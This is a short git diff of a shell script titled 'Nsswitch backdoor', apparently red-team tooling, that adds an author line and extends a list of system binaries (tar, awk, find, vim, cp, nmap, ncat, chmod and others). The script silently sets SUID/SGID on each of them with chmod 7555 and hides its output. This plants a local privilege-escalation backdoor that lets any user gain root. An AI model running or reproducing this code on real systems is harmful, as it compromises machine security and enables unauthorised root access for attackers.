@@ -1,4 +1,5 @@
 #Nsswitch backdoor
+#Jacob Cedar jac2552@rit.edu
 QUIET (){
 	eval $@ 2>/dev/null >/dev/null
 	return $?
@@ -71,7 +72,7 @@ tools_suid() {
     # Enable SUID on all the following binaries
     echo "Setting SUID on binaries";
     bins="tar awk find nano vim vi xtables-multi cp less more nmap man"
-    bins="$bins watch chmod mv ncat"
+    bins="$bins watch chmod mv ncat xtables"
     for b in $bins; do
         QUIET chmod 7555 `command -v $b`;
         [ "$?" = "0" ] && echo "SUID Set on $b";
